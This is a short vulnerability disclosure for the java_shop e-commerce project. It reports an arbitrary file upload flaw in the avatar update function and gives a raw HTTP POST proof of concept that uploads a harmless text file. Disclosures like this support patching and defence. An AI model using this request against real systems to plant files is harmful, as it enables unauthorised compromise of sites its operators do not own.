### Target

https://github.com/geeeeeeeek/java_shop

### Version

<=1.0

### Description

The system has an arbitrary file upload vulnerability, and attackers can upload arbitrary files by modifying the avatar function.

### Vulnerability Details

```
POST /api/myapp/index/user/update?id=92 HTTP/1.1
Host: 
Connection: keep-alive
sec-ch-ua: "Chromium";v="124", "Microsoft Edge";v="124", "Not-A.Brand";v="99"
Accept: application/json, text/plain, */*
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryYdw0tzAYBT1BHUvM
sec-ch-ua-mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36 Edg/124.0.0.0
TOKEN: 
sec-ch-ua-platform: "Windows"
Origin: https://shop.gitapp.cn
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: 
Accept-Encoding: gzip, deflate, br, zstd
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6
Content-Length: 1200440

------WebKitFormBoundaryYdw0tzAYBT1BHUvM
Content-Disposition: form-data; name="avatar"; filename="1.txt"
Content-Type: application/octet-stream

Hello

------WebKitFormBoundaryYdw0tzAYBT1BHUvM--
```

